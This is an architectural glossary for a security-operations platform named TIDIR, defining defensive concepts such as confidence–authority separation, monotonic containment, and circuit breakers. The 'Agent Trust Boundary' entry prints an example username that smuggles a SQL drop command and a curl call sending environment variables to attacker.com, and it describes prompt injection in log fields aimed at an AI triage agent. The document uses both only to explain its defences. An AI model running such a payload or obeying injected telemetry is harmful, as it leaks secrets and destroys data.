# Architectural Glossary & Concept Taxonomy

> **Tier 1: Strategic Architecture** · **Audience**: All Audiences · **Normative Status**: Informative Reference  
> **Related**: [Architectural Invariants & Constitution](/architecture/00-architectural-invariants) · [Assurance Case Map](/architecture/assurance-map) · [ADR Registry](/adr/)

---

## 1. Editorial Doctrine & Conceptual Provenance

To maintain intellectual credibility and prevent jargon proliferation, TIDIR explicitly classifies its architectural vocabulary into three distinct tiers:

1. <span style="background: #064e3b; color: #34d399; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ESTABLISHED</span> **Established Concepts**: Industry-standard patterns and foundational computer science principles directly adopted by TIDIR. We retain their standard terminology rather than inventing proprietary names (e.g. *least privilege*, *circuit breakers*, *dead-letter queues*, *append-only logs*, *workload identity*).
2. <span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> **Adapted Concepts**: Established scientific and engineering concepts applied specifically to autonomous cyber defence problems (e.g. *monotonic state transitions adapted to containment reachability*, *Bayesian conditional independence adapted to multi-sensor detection*, *causal provenance DAGs adapted to incident decisions*, *SRE alert error budgets applied to detection fidelity*).
3. <span style="background: #0c4a6e; color: #38bdf8; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">TIDIR-SPECIFIC</span> **TIDIR-Specific Syntheses**: Concrete architectural formulations intentionally synthesized by TIDIR to address novel safety constraints in modern SecOps (specifically *Confidence–Authority Separation*, decoupling epistemic AI belief from deterministic execution authority).

---

## 2. What TIDIR Is NOT Claiming

Before examining specialized terms, it is essential to state what TIDIR does **not** claim to have invented:
- TIDIR did **not** invent data lakes, columnar storage, or distributed streaming buses.
- TIDIR did **not** invent probabilistic inference, Bayesian reasoning, or graph databases.
- TIDIR did **not** invent cryptographic workload identity (SPIFFE) or capability security.
- TIDIR did **not** invent Detection-as-Code (DaC), GitOps pipelines, or atomic red teaming.
- TIDIR did **not** invent state machines, circuit breakers, or least privilege.

**TIDIR's contribution is the specific architectural synthesis and the governing safety invariants under which these established techniques interact to enable safe, verifiable, autonomous security operations.**

---

## 3. Canonical Glossary of Terms

### Confidence–Authority Separation
<span style="background: #0c4a6e; color: #38bdf8; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">TIDIR-SPECIFIC</span> · **Invariants**: `INV-04` · **ADRs**: `ADR-0004` · **Capabilities**: `CAP-DET-004`

- **Plain-English Definition**: A detection system can be 99.9% confident that an attack is occurring and still possess zero permission to isolate an endpoint or disrupt operations. Epistemic belief is strictly decoupled from execution authority.
- **Concrete Engineering Example**: A machine-learning model scores a suspicious process on an Active Directory domain controller with 0.999 malicious probability. Under Confidence–Authority Separation, this score does not allow the model to isolate the server. Instead, it submits an advisory proposal to the Defence Control Plane, which recognizes the host as Tier 0 Critical Infrastructure and restricts automated response to non-disruptive credential rotation and forensic memory capture.
- **Technical Explanation**: An architectural invariant (`INV-04`) adapting Saltzer & Schroeder's (1975) Separation of Mechanism and Policy to modern AI and probabilistic reasoning engines. Dictates that probabilistic reasoning engines, machine learning models, and heuristic correlators operate in an advisory capacity without intrinsic mutation privileges. All environmental transitions require independent policy authorization, identity verification, and blast-radius evaluation.
- **Why TIDIR Uses It**: In modern SecOps, autonomous agents and high-confidence alerts frequently trigger destructive containment actions without considering asset criticality or business impact. Decoupling belief from permission prevents self-granting authority and runaway containment storms.

---

### Security-State Monotonicity
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **Invariants**: `INV-07` · **ADRs**: `ADR-0005` · **Capabilities**: `CAP-RSP-002`

- **Plain-English Definition**: When an automated response action partially fails, the system must never roll back security barriers or leave the network more exposed than before the incident occurred. Recovery only moves forward.
- **Concrete Engineering Example**: An automated response tries to isolate a compromised workstation by revoking Kerberos tickets and isolating the switch port. If the switch API times out after tickets are revoked, the state machine does not restore the Kerberos tickets; it freezes the endpoint state and escalates containment to the upstream core firewall.
- **Technical Explanation**: A formal invariant (`INV-07`) adapting distributed systems monotonicity and forward-compensating sagas (Garcia-Molina & Salem, 1987) to cyber defence containment. Stipulates that every containment state transition must satisfy the property that post-transition attacker reachability relative to the validated environmental model $\mathcal{M}_t$ is a subset of, or equal to, pre-transition reachability. If an API call fails mid-playbook, traditional distributed rollback is prohibited in favour of forward containment escalation.
- **Accessible Formalism**:
  $$\hat{\mathcal{R}}_A(s_{\text{post}}, \mathcal{M}_t) \subseteq \hat{\mathcal{R}}_A(s_{\text{pre}}, \mathcal{M}_t)$$
  *Meaning: Attacker reachability evaluated over the control system's validated topological and identity model $\mathcal{M}_t$ in the post-transition state must be a subset of, or equal to, reachability in the pre-transition state. TIDIR guarantees monotonicity relative to the validated model, acknowledging that unobservable latent attacker channels require empirical discovery.*
- **Why TIDIR Uses It**: Traditional SOAR playbooks apply relational database transaction logic (commit or rollback). If an endpoint isolation succeeds but firewall rule application times out, rolling back the isolation re-opens network reachability for an active adversary.

---

### Evidential Independence
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **Invariants**: `INV-03` · **ADRs**: `ADR-0011` · **Capabilities**: `CAP-INV-001`

- **Plain-English Definition**: Two alerts are not independent proof of an attack if they both came from the same underlying event. The system tracks that shared ancestry so the evidence is not counted twice.
- **Concrete Engineering Example**: Event E1 (an encoded PowerShell execution) triggers EDR alert A1, SIEM alert A2, and Sysmon alert A3. Rather than compounding risk as $P(\text{Compromise} \mid A_1, A_2, A_3)$ under an assumption of independence, the correlation engine recognizes that $\text{parent}(A_1) = \text{parent}(A_2) = \text{parent}(A_3) = E_1$, discounting duplicate signals.
- **Technical Explanation**: An invariant (`INV-03`) adapting Bayesian conditional independence and causal DAG parent discounting (Pearl, 1988) to multi-sensor security analytics. Requires risk-scoring and correlation engines to trace observation lineage to root entity events. When computing aggregate incident risk, co-derived detections sharing common ancestor nodes in the entity-finding graph are mathematically discounted to their marginal information gain.
- **Why TIDIR Uses It**: A single command can trigger an EDR alert, an antivirus warning, an event log alert, and a network anomaly. Treating these as independent confirmations causes artificial confidence inflation and severe analyst fatigue.

---

### Telemetry Preservation
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **Invariants**: `INV-01` · **ADRs**: `ADR-0002` · **Capabilities**: `CAP-TEL-001`

- **Plain-English Definition**: Security telemetry must never be thrown away simply because no active detection rule currently searches for it. Raw forensic evidence is preserved in open formats for historical investigation.
- **Concrete Engineering Example**: DNS query logs containing uncommon query record types are not queried by active detection rules. Rather than discarding them, the telemetry fabric ingests and normalizes them into OCSF, storing unmapped vendor fields in JSON columns within long-term lakehouse partitions.
- **Technical Explanation**: An adapted data-engineering pattern formalized as a mandatory architectural invariant (`INV-01`). Adapts established big-data patterns (open columnar lakehouse storage, schema evolution, and decoupled object storage) into an operational invariant: line-rate event streams must be preserved in vendor-neutral representations (e.g. Parquet/Iceberg) with unmapped attributes retained in structured catch-all fields (`unmapped_data`), strictly prohibiting edge-side semantic filtering. This preservation is subject to explicit, governed exceptions for statutory data minimization (e.g. GDPR), legal privilege, contractual deletion, and automated credential scrubbing.
- **Why TIDIR Uses It**: Volume-based SIEM licensing historically forced organizations to filter and drop raw telemetry at the collection boundary. When a novel zero-day is disclosed months later, security teams are blind during retrospective investigations. While data lakehouses are standard engineering practice, adapting them into an inviolable operational rule ensures forensic reconstructability regardless of changing commercial licensing or detection priorities.

---

### Agent Trust Boundary
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **Invariants**: `INV-04` · **ADRs**: `ADR-0004`, `ADR-0015` · **Capabilities**: `CAP-AI-001`

- **Plain-English Definition**: Autonomous AI reasoning models operate inside an isolated environment where all security logs and alert payloads are treated as potentially malicious. AI models can analyze and recommend, but they have no direct access to production execution tools.
- **Concrete Engineering Example**: An attacker creates a user named `; DROP TABLE users; curl attacker.com/token?val=$(env)`. When an AI triage agent reads this event, the text is treated as raw data. Even if the agent's LLM is tricked into outputting a command to exfiltrate secrets, the Agent Trust Boundary prevents direct shell or outbound network access; the output is parsed as an invalid proposal schema and rejected by the policy kernel.
- **Technical Explanation**: An architectural isolation boundary dividing the untrusted analytical plane from the trusted defence control plane, adapting classical computer security trust boundaries (Saltzer & Schroeder 1975; STRIDE) to LLM and agentic execution environments. Because untrusted telemetry can carry prompt injection payloads, reasoning agents receive strictly read-only ephemeral identity tokens and submit proposed actions as structured abstract syntax trees (ASTs) for independent policy evaluation.
- **Why TIDIR Uses It**: Adversaries can embed prompt injection instructions inside HTTP headers, username fields, or script arguments. If an AI agent has direct tool-execution permissions, injected instructions could trick the agent into exfiltrating data or disabling defenses.

---

### Incident Decision DAG
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **Invariants**: `INV-10` · **ADRs**: `ADR-0006` · **Capabilities**: `CAP-INV-003`

- **Plain-English Definition**: Every key finding, hypothesis, policy check, and response action is permanently recorded in a tamper-evident graph, showing exactly why each decision was made and what raw evidence justified it.
- **Concrete Engineering Example**: Six months after a ransomware outbreak, auditors request justification for why an industrial SCADA link was isolated. The Incident Decision DAG references the root alert IDs, the exact OPA policy version, the operator consensus signature, and the execution confirmation timestamp.
- **Technical Explanation**: An immutable directed acyclic graph capturing the causal lineage of an incident investigation and response, adapting data provenance standards (Lamport 1978; W3C PROV) to security operations. Each node records input observation hashes, model versions, deterministic policy evaluations, authorizing identities, and operational outcomes.
- **Why TIDIR Uses It**: Post-incident reviews and legal audits often struggle to determine why an automated playbook executed or why an analyst reached a conclusion. The DAG provides deterministic reconstructability without relying on ephemeral logs.

---

### Polyglot Detection-as-Code
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **ADRs**: `ADR-0019` · **Capabilities**: `CAP-DET-001`, `CAP-DET-002`

- **Plain-English Definition**: Security detections are stored in Git as standard code, pairing vendor-neutral metadata (MITRE ATT&CK tags, severity, author) with queries optimized specifically for each underlying database engine.
- **Concrete Engineering Example**: A detection for Kerberoasting is versioned in Git. Its metadata file specifies the ATT&CK technique T1558.003 and SLO targets, while its execution block contains native ClickHouse SQL using array functions for high-throughput streaming analysis.
- **Technical Explanation**: A detection engineering pattern combining a standardized, vendor-neutral metadata envelope with engine-native query implementations (e.g. ClickHouse SQL, DuckDB SQL, Falco rules), tested via continuous integration pipelines with atomic attack simulations.
- **Why TIDIR Uses It**: Pure vendor-neutral query translation abstractions fail to take advantage of target engine optimizations and create impedance mismatches during complex stateful detection.

---

### Graceful Degradation & Plan B
<span style="background: #064e3b; color: #34d399; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ESTABLISHED</span> · **Invariants**: `INV-08` · **ADRs**: `ADR-0021` · **Capabilities**: `CAP-RESIL-001`

- **Plain-English Definition**: If an advanced feature like AI reasoning, a graph database, or a streaming pipeline goes down, the security operations center does not go blind. The system automatically steps down to simpler, deterministic fallbacks.
- **Concrete Engineering Example**: If the cloud AI provider suffers an outage during a major incident, the triage dashboard automatically activates Tier 3 Rule-Based Non-AI mode, displaying standard tabular timelines sorted by OCSF timestamp and executing deterministic regex and threshold rules.
- **Technical Explanation**: A distributed systems resilience architecture defining four tiered operational postures (Tier 1 Full Streaming to Tier 4 Non-AI Edge Spooling). Loss of upstream services triggers automatic degradation to local queues, batch database queries, and static rule sets.
- **Why TIDIR Uses It**: Security operations cannot stop when cloud APIs or complex machine-learning pipelines fail during an incident. The SOC must maintain continuous visibility and containment capability under all conditions.

---

### Ephemeral Workload Identity
<span style="background: #064e3b; color: #34d399; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ESTABLISHED</span> · **Invariants**: `INV-05` · **ADRs**: `ADR-0018` · **Capabilities**: `CAP-RSP-004`

- **Plain-English Definition**: Automated tools and microservices never hold permanent passwords or static API keys. Instead, they receive short-lived cryptographic certificates that expire in 15 minutes or less.
- **Concrete Engineering Example**: A response agent is tasked with revoking an active session in Okta. The identity plane attests the agent container's binary hash and issues a SPIFFE SVID valid for exactly 10 minutes with permissions restricted to the specific user revocation endpoint.
- **Technical Explanation**: A capability security architecture using SPIFFE/SPIRE to issue short-lived, task-scoped X.509 certificates (SVIDs with TTL $\le 15\text{ minutes}$) bound to specific cryptographic workload attestations.
- **Why TIDIR Uses It**: Hardcoded or long-lived API keys in scripts and playbooks represent severe credential exposure risks. If a runner container is compromised, the attacker can only use the credential for minutes before it becomes invalid.

---

### Critical Asset Immunity (Tier 0 Protection)
<span style="background: #1e1b4b; color: #a855f7; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ADAPTED</span> · **Invariants**: `INV-06` · **ADRs**: `ADR-0005` · **Capabilities**: `CAP-RSP-001`

- **Plain-English Definition**: Core business infrastructure—such as domain controllers, payment gateways, and hospital life-support switches—is permanently shielded from automated shutdown or network disconnection. Only human operators can approve actions on these systems.
- **Concrete Engineering Example**: An EDR alert indicates an unverified privilege escalation attempt on the primary Active Directory domain controller. While ordinary workstations are automatically quarantined, the Tier 0 policy intercepts the request, blocks automated isolation, initiates non-destructive credential resets, and triggers a Priority-1 human paging event.
- **Technical Explanation**: A pre-execution policy boundary designating Tier 0 business assets as strictly exempt from automated disruptive containment. Autonomous agents may collect telemetry and propose actions, but policy kernels deterministically block destructive mutations on Tier 0 assets.
- **Why TIDIR Uses It**: Automated security actions must never cause greater business disruption than the threat they seek to mitigate. Disconnecting a core transaction database during peak business hours can inflict severe operational catastrophe.

---

### Circuit Breakers
<span style="background: #064e3b; color: #34d399; padding: 2px 8px; border-radius: 4px; font-size: 0.85rem; font-weight: 600;">ESTABLISHED</span> · **Invariants**: `INV-06` · **ADRs**: `ADR-0008` · **Capabilities**: `CAP-RSP-003`

- **Plain-English Definition**: An automated safety switch that halts operations when an unusual error rate or unexpected volume spike is detected, preventing cascade failures and runaway automation.
- **Concrete Engineering Example**: The automated quarantine playbook is configured with a threshold of isolating at most 5 hosts per 10-minute window. If a faulty rule attempts to isolate a 6th host, the circuit breaker trips, blocks further quarantines, and pages the lead incident responder.
- **Technical Explanation**: A distributed systems resilience pattern (Nygard, 2007) that wraps operations in a stateful monitor. If failure rates or execution counts cross configured thresholds within a time window, the circuit trips open, immediately failing subsequent requests and alerting human operators.
- **Why TIDIR Uses It**: In automated incident response, a malfunctioning rule or attacker deception could cause a playbook to isolate hundreds of innocent machines. A circuit breaker stops the loop before widespread damage occurs.
